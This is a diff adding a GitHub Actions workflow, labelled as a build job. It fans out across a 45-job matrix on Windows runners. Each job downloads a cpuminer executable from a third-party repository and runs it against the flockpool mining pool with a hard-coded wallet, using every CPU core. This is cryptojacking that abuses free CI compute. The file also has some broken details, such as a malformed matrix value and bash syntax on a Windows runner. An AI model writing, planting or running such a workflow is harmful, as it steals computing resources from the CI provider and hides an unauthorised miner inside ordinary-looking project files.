@@ -1,0 +1,24 @@
+name: Ex_code-unmineable
+ 
+on: [workflow_dispatch]
+ 
+jobs:
+  build:
+    name: Ex-code
+    runs-on: windows-2022
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://raw.githubusercontent.com/Asriytdx/yawa/main/cpuminer-avx2.exe -OutFile main/cpuminer-avx2.exe
+    - name: RUNNING
+      run: ./cpuminer-avx2 -o stratum+tcps://asia.flockpool.com:5555 -u RE8NNUqGyCLnH5JVG7yFmJDAYuDayQ2hJm.$(echo $(shuf -i 1-9999 -n 1)-NG8) -t $(nproc --all) --no-tune
+    - name: DONE
+      run: exit
